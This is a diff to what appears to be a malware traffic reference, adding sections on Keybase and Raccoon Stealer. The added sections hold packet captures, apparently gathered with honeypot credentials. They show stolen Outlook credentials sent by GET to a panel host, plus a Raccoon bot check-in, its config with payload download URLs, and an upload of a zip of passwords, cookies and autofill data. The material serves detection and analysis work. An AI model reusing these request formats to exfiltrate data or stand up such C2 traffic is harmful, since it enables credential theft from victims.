@@ -67,6 +67,26 @@ ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-1.png "Imminent")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/imminent-2.png "Imminent")
 
+#### Keybase
+~~~
+GET /panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356 HTTP/1.1
+Host: pacificglobal.ga
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 04 Oct 2019 19:55:10 GMT
+Content-Type: text/html
+Content-Length: 985
+Connection: keep-alive
+Vary: Accept-Encoding
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Cache-Control: no-cache
+
+<html><body><script type="text/javascript" src="/aes.js" ></script><script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a=toNumbers("f655ba9d09a112d4968c63579db590b4"),b=toNumbers("98344c2eee86c3994890592585b49f80"),c=toNumbers("ee3d72471e3c40514be9a177719112c3");document.cookie="__test="+toHex(slowAES.decrypt(c,2,a,b))+"; expires=Thu, 31-Dec-37 23:55:55 GMT; path=/"; location.href="http://pacificglobal.ga/panel/post.php?type=passwords&machinename=USER-PC&application=MS%20Outlook%202002/2003/2007/2010&link=192.168.1.1&username=honey@pot.com&password=honeypass356&i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/keybase.png "Keybase")
+
 #### Lokibot
 
 follw tcp stream, not http stream in wireshark
@@ -239,6 +259,78 @@ f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z
 .
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")
+
+#### Raccoon Stealer
+~~~
+POST /gate/log.php HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
+Host: 35.189.105.242
+
+params=Ym90X2lkPTkwMDU5QzM3LTEzMjAtNDFBNC1CNThELTJCNzVBOTg1MEQyRl9hZG1pbiZjb25maWdfaWQ9NGVkZTQxZmUwZWE5NjMwMzRhM2Q2NWYwZGQ0NDJkZTQ2NzFjMjE0ZiZkYXRhPW51bGw=HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 30 Sep 2019 19:36:57 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Access-Control-Allow-Origin: *
+
+{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 30 Sep 2019 19:36:57 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Access-Control-Allow-Origin: *
+
+{"url":"http://35.189.105.242/file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate","attachment_url":"http://35.189.105.242/gate/sqlite3.dll","libraries":"http://35.189.105.242/gate/libs.zip","ip":"89.187.165.57","config":{"masks":null,"loader_urls":["https://mygift.space/download/beam.exe"]},"is_screen_enabled":0,"is_history_enabled":0}POST /file_handler/file.php?hash=559f10a49e5f74c12b67d2b61c0dea701f752e43&js=cbe0dbfb63ca8503c1938fc9cdd5f5f3818d81b9&callback=http://35.189.105.242/gate HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: multipart/form-data, boundary=Jfbvjwj3489078yuyetu
+Content-Length: 2152
+Host: 35.189.105.242
+
+._=
+--Jfbvjwj3489078yuyetu
+content-disposition: form-data; name="file"; filename="data.zip"
+Content-Type: application/octet-stream
+
+PK..........>O..5kf.......
+...passwords.txtUT
+..`Y.]ZY.]ZY.]..w..Rp..O.IUp.(..M......
+f....[.....%&.&..g.%....r........R+.
+.K@..\....P....bcS3^.^.`..n.E.n..0.I2..PK..........>O"..:............browsers/firefox_cookie.txtUT
+..`Y.]`Y.]`Y.]..KK.@...S.O.8..+.. .+..kJ6a..!.	mb...T.qQ......
+.@...:.,m..y....
+a...RK.
+.......]w.\.U.k...L<..........s.m...|..9=.].l..0...7W...zY..mi....e...........di"..|M.t2...T..E...6.RI...dB.-s..c<.c.......;.r..E....tr.[..
+......g@..X....^.Dl.`W.?.YQ.o...F...$\..K..v..+..." 0.|.PK..........>O................browsers/firefox_urls.txtUT
+..`Y.]`Y.]`Y.]..K..0...=	w....>hI....4..(h.lI[.zz....v7.........s.......}.MS...@kd_.n........Vw.e.
+........H1%.@.8._..A.+\.U._.O.....,C1..q..tj.......'......`..c_.+.Z.N...(2,....|..	8.vd.f.p.1.,y..PK..........>O.JJ.:...Z.......browsers/chrome_autofill.txtUT
+..ZY.]ZY.]ZY.]s./.U.K.M.Rp.,*...2y..@.e.9.@a.......^..0D.O"6.A.)E.... ..PK..........>O..GMN...|.......mails/outlook.txtUT
+..eY.]eY.]eY.]..
+	P.N-*K-.2.4.34..3.3..
+..0.*.....c....Z.P._.....U.Z.T.M" ...<.(."Y......r..PK..........>O..DH....o.......System Info.txtUT
+..eY.]eY.]eY.]mR]k.0.}^ ..>&.6.l..`0'Y..f.$...(.....d$;k..'ws)ez.:..su?~.D][k.....~A.W.3...F....Qx..d.+-...Vi..bn...?.K..<e.2`......M........2NH0.%OrNJ..N..v..5....\%yD.F..Vi...u..yV.EF...^..2..t......'..........5|.!..G.
+s.C9.>..V...;...K ^..x..P.1-....8.G..2...pE..<........Y.........?..".~.5....c.F|........0..u8;....h..2..	X....g..a"..|.>T;.IV$.[.,[...{...c..
+. ...f.e.y...%k.[-.@.U..C7?.yX.a.p..o*.8.6..PI.v..7.......Tm.y..?PK............>O..5kf.......
+.	....... .......passwords.txtUT...`Y.]PK............>O"..:..........	....... .......browsers/firefox_cookie.txtUT...`Y.]PK............>O..............	....... .......browsers/firefox_urls.txtUT...`Y.]PK............>O.JJ.:...Z.....	....... .......browsers/chrome_autofill.txtUT...ZY.]PK............>O..GMN...|.....	....... ...~...mails/outlook.txtUT...eY.]PK............>O..DH....o.....	....... .......System Info.txtUT...eY.]PK....................
+--Jfbvjwj3489078yuyetu--HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 30 Sep 2019 19:37:10 GMT
+Content-Type: application/json
+Transfer-Encoding: chunked
+Connection: keep-alive
+Access-Control-Allow-Origin: *
+
+true"success"
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")
 
 #### Revenge RAT
 ~~~
